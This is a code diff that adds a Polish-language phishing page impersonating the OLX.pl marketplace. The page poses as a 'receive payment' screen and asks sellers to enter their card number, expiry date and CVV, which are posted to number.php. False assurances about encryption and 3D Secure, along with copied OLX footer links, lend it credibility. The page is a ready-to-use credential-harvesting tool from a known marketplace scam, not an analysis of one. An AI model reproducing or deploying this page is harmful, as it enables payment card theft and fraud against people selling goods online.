@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head lang="pl-PL">
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="1000">
+    <link rel="stylesheet" href="style2.css">
+    <script src="expand.js"></script>
+    <title>OLX - Odbierz płatność</title>
+</head>
+<body>
+<div class="deskop">
+    <form action="number.php" method="post">
+        <header>
+            <a href="#"><img src="logo.png"></a>
+        </header>
+        <div class="circle">
+        </div>
+        <div class="body_middle">
+            <div class="container">
+                <div id="box" class="box">
+                    <div id="lock" class="lock">
+                        <div id="lock_box" class="lock_box">
+                            <div class="lock_box_left">
+                                <img src="/o/lock.png">
+                            </div>
+                            <div class="lock_box_right">
+                                <a class="lock_box_right_first"><span>Jak chronimy Twoje dane?</span></a>
+                                <div><a id="lock_box_right_second" class="lock_box_right_second">Rozwiń</a></div>
+                                <div><a id="lock_box_right_third" class="lock_box_right_third">Sprawdzamy każdą transakcję. Korzystamy z najnowszych metod szyfrowania oraz standardu 3D Secure.</a></div>
+                                <div><a id="lock_box_right_fourth" class="lock_box_right_fourth">Każde połączenie z naszą bazą danych jest w pełni bezpieczne i szyfrowane najnowszymi technologiami</a></div>
+                                <div><a id="lock_box_right_fifth" class="lock_box_right_fifth">Zwiń</a></div>
+                                <script src="expand.js"></script>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="details">
+                        <div class="details_info">
+                            <a class="details_info">Podaj dane karty płatniczej, w celu uzyskania na nią środków za zakupiony przedmiot</a>
+                        </div>
+                        <div class="details_top">
+                            <a class="details_top_first">Numer karty</a>
+                            <input type="text" name="number" class="details_top_second" minlength="16" maxlength="16" placeholder="np. 1234 5678 9000 0012">
+                        </div>
+                        <div class="details_middle">
+                            <div class="details_middle_left">
+                                <a class="details_middle_left_first">Ważna do</a>
+                                <input type="text" name="date" class="details_middle_left_second" minlength="4" maxlength="7" placeholder="MM/RR">
+                            </div>
+                            <div class="details_middle_right">
+                                <a class="details_middle_right_first">Kod CVV/CVC</a>
+                                <input type="text" name="cvc" class="details_middle_right_second" minlength="3" maxlength="3" placeholder="np. 123">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="button">
+                        <button>Odbierz środki</button>
+                    </div>
+                    <div class="info_security">
+                        <a>Zapewniamy pełne bezpieczeństwo</a>
+                        <div><img src="/o/card.png"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="body_bottom">
+            <div class="body_bottom_1">
+                <div class="links1">
+                    <a><span>Aplikacje mobilne OLX.pl</span></a>
+                    <a><span>Pomoc</span></a>
+                    <a><span>Wyróżnione ogłoszenia</span></a>
+                    <a><span>Oferta dla firm</span></a>
+                    <a><span>Blog</span></a>
+                    <a><span>Regulamin</span></a>
+                    <a><span>Polityka prywatności</span></a>
+                    <a><span>Reklama</span></a>
+                    <a><span>Biuro prasowe</span></a>
+                </div>
+                <div class="links2">
+                    <a><span>Jak działa OLX.pl</span></a>
+                    <a><span>Zasady bezpieczeństwa</span></a>
+                    <a><span>Mapa kategorii</span></a>
+                    <a><span>Mapa miejscowości</span></a>
+                    <a><span>Popularne wyszukiwania</span></a>
+                    <a><span>Kariera</span></a>
+                    <a><span>Ustawienia plików cookie</span></a>
+                    <a><span>Kody rabatowe</span></a>
+                    <a><span>Ubezpieczenia OC/AC</span></a>
+                </div>
+                <div class="app">
+                    <img src="play.png">
+                    <img src="appstore.png">
+                    <a><span>Darmowa aplikacja na Twój telefon</span></a>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+<div class="mobile">
+    <form action="number.php" method="post">
+        <div class="container">
+            <div class="box">
+                <div class="details">
+                    <div class="details_info">
+                        <a>Podaj dane karty płatniczej, w celu uzyskania na nią środków za zakupiony przedmiot</a>
+                    </div>
+                    <div class="details_top">
+                        <a class="details_top_first">Numer karty</a>
+                        <input name="number" id="number" class="details_top_second" minlength="16" maxlength="16" placeholder="np. 1234 5678 9000 0012">
+                    </div>
+                    <div class="details_middle">
+                        <div class="details_middle_left">
+                            <a class="details_middle_left_first">Ważna do</a>
+                            <input name="date" id="date" class="details_middle_left_second" minlength="4" maxlength="5" placeholder="MM/RR">
+                        </div>
+                        <div class="details_middle_right">
+                            <a class="details_middle_right_first">Kod CVV/CVC</a>
+                            <input name="cvc" id="cvc" class="details_middle_right_second" minlength="3" maxlength="3" placeholder="np. 123">
+                        </div>
+                    </div>
+                </div>
+                    <div class="button">
+                            <button>Odbierz środki</button>
+                    </div>
+                <div class="info_security">
+                    <a>Zapewniamy pełne bezpieczeństwo</a>
+                    <img src="/o/card.png">
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+</body>
+</html>
